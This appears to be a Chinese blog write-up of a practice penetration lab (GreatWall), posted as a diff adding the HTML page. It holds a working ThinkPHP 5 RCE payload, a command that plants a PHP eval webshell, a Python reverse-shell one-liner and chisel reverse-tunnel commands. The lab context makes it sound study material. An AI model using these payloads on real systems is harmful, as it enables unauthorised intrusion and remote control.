@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="color-scheme" content="light dark">
+    <meta name="generator" content="Typst">
+    <title>春秋云境笔记 - 1 | weyung's Blog</title>
+    <meta name="date" content="2025-04-09">
+    <link rel="canonical" href="https://weyung.cc/posts/35bd6be6/">
+    <meta property="og:title" content="春秋云境笔记 - 1 | weyung's Blog">
+    <meta property="og:type" content="article">
+    <meta name="description" content="GreatWall / *">
+    <meta property="og:description" content="GreatWall / *">
+    <meta property="og:url" content="https://weyung.cc/posts/35bd6be6/">
+    <meta name="author" content="weyung">
+    <meta property="article:author" content="weyung">
+    <meta name="twitter:card" content="summary">
+    <meta name="language" content="zh">
+    <link rel="icon" href="/assets/avatar.png">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net">
+    <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+    <script type="text/javascript">
+      (function(){var key='typ-blog-theme';var theme=null;try{var stored=localStorage.getItem(key);if(stored==='gray-10'||stored==='gray-90'||stored==='gray-100'||stored==='white'){theme=stored;}}catch(_){ }if(!theme){theme=window.matchMedia('(prefers-color-scheme: dark)').matches?'gray-90':'gray-10';}document.documentElement.setAttribute('data-theme',theme);var bg=theme==='gray-90'?'#262626':theme==='gray-100'?'#161616':theme==='white'?'#ffffff':'#f4f4f4';document.documentElement.style.backgroundColor=bg;})();
+    </script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-sans@1.1.0/css/ibm-plex-sans-all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-mono@1.1.0/css/ibm-plex-mono-all.min.css">
+    <link rel="stylesheet" href="/assets/core/colors.css">
+    <link rel="stylesheet" href="/assets/core/main.css">
+    <link rel="stylesheet" href="/assets/custom.css">
+    <link rel="stylesheet" href="/assets/custom-toc.css">
+    <script type="module" src="/assets/core/render-code.js"></script>
+    <script type="module" src="/assets/core/theme.js"></script>
+    <script type="module" src="/assets/core/post-nav-switch.js"></script>
+    <script type="module" src="/assets/custom-toc.js"></script>
+  </head>
+  <body>
+    <div class="page-shell">
+      <header>
+        <div class="site-header">
+          <div class="nav-shell">
+            <nav>
+              <button class="nav-menu-switch" type="button" aria-label="打开导航"></button>
+              <div class="nav-title">weyung's Blog</div>
+              <div class="nav-body has-post-title">
+                <div class="nav-body-upper">
+                  <div class="nav-body-upper-title">weyung's Blog</div>
+                  <div class="nav-body-upper-links"><a href="/">首页</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archive/">归档</a><a href="/links/">友链</a><a href="/about/">关于</a></div>
+                </div>
+                <div class="nav-body-lower">春秋云境笔记 - 1</div>
+              </div>
+              <button class="nav-theme-switch" type="button" aria-label="切换主题"></button>
+            </nav>
+            <div class="nav-sidebar-backdrop"></div>
+            <aside class="nav-sidebar"><a class="nav-sidebar-item" href="/">首页</a><a class="nav-sidebar-item" href="/categories/">分类</a><a class="nav-sidebar-item" href="/tags/">标签</a><a class="nav-sidebar-item" href="/archive/">归档</a><a class="nav-sidebar-item" href="/links/">友链</a><a class="nav-sidebar-item" href="/about/">关于</a></aside>
+          </div>
+        </div>
+      </header>
+      <div class="post-header">
+        <div class="post-header-inner">
+          <h1>春秋云境笔记 - 1</h1>
+        </div>
+      </div>
+      <article>
+        <section>
+          <h3>GreatWall</h3>
+          <p>用 fscan 扫一下，直接就扫出是 tp5 的漏洞</p>
+          <pre><code class="language-plain">[2025-04-12 15:40:37] [SUCCESS] 目标: http://8.130.145.86:8080
+  漏洞类型: poc-yaml-thinkphp5023-method-rce
+  漏洞名称: poc1
+  详细信息:
+        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</code></pre>
+          <p>用 PoC 试了一下，可以 RCE，对着路由 <code class="language-text">/index.php?s=captcha</code> 发一个 POST，带上如下参数：</p>
+          <pre><code class="language-bash">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></pre>
+          <p>执行 <code class="language-text">pwd</code> 看到当前目录为 <code class="language-text">/var/www/html/background/public</code></p>
+          <p>执行以下命令写一个 PHP 马，注意要使用单引号，双引号的话 <code class="language-text">$_POST</code> 变量会被解析掉，导致写的马不对</p>
+          <pre><code class="language-bash">echo '&lt;?php @eval($_POST[cmd]);?>' > /var/www/html/background/public/test.php</code></pre>
+          <p>用蚁剑连接，在根目录拿到 flag01：<code class="language-text">flag{176f49b6-147f-4557-99ec-ba0a351e1ada}</code></p>
+          <p>再写个 python 反弹 shell 的脚本：</p>
+          <pre><code class="language-python">import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);</code></pre>
+          <p>然后在蚁剑的终端里执行（蚁剑这个终端就怪怪的） 用蚁剑把 fscan 传上去，执行 <code class="language-text">ip a</code> 看一下地址</p>
+          <p>搞个 <a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener noreferrer">chisel</a>，在 VPS 上执行</p>
+          <pre><code class="language-bash">./chisel_1.10.1_linux_amd64 server -p 6667 --reverse</code></pre>
+          <pre><code class="language-bash">./chisel client *.*.*.*:6667 R:0.0.0.0:10000:socks &amp;</code></pre>
+          <h3>参考</h3>
+          <p><a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Yunjing/dimension/GreatWall/" target="_blank" rel="noopener noreferrer">2024 - GreatWall</a></p>
+          <div class="post-meta">
+            <div class="post-tag"><span class="post-tag-desc">标签</span><span class="post-tag-group"><a class="post-tag-item tag-item-with-icon" href="/tags/web/" style="--tag-background:var(--tag-background-purple);--tag-color:var(--tag-color-purple);--tag-background-hover:var(--tag-hover-purple);--tag-border:var(--tag-border-purple);--tag-border-hover:var(--tag-border-purple);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-globe.svg&quot;);"></span><span class="tag-content"><span>Web</span></span></a><a class="post-tag-item tag-item-with-icon" href="/tags/渗透/" style="--tag-background:var(--tag-background-teal);--tag-color:var(--tag-color-teal);--tag-background-hover:var(--tag-hover-teal);--tag-border:var(--tag-border-teal);--tag-border-hover:var(--tag-border-teal);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-sword.svg&quot;);"></span><span class="tag-content"><span>渗透</span></span></a></span></div>
+            <div class="post-time"><span class="post-time-desc">日期</span><span>2025 年 4 月 9 日</span></div>
+            <div class="post-category"><span class="post-category-desc">分类</span><a class="post-category-link" href="/categories/pentest/">Pentest</a></div>
+          </div>
+          <div class="post-license">
+            <div class="post-license-item"><span class="post-license-label">文章作者</span><span>weyung</span></div>
+            <div class="post-license-item"><span class="post-license-label">文章链接</span><a href="https://weyung.cc/posts/35bd6be6/">https://weyung.cc/posts/35bd6be6/</a></div>
+            <div class="post-license-item"><span class="post-license-label">许可协议</span><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a></div>
+          </div>
+        </section>
+      </article>
+      <div class="post-neighbors">
+        <div class="post-neighbors-inner"><a class="post-neighbor" href="/posts/da1de1c0/"><div class="post-neighbor-top">上一篇</div><p class="post-neighbor-title">2025 XYCTF</p></a><a class="post-neighbor" href="/posts/8a6f9a7b/"><div class="post-neighbor-top">下一篇</div><p class="post-neighbor-title">Java 基础概念</p></a></div>
+      </div>
+      <footer>
+        <div class="post-footer">2026 ~ Present Carbon Typst Blog</div>
+      </footer>
+    </div>
+  </body>
+</html>
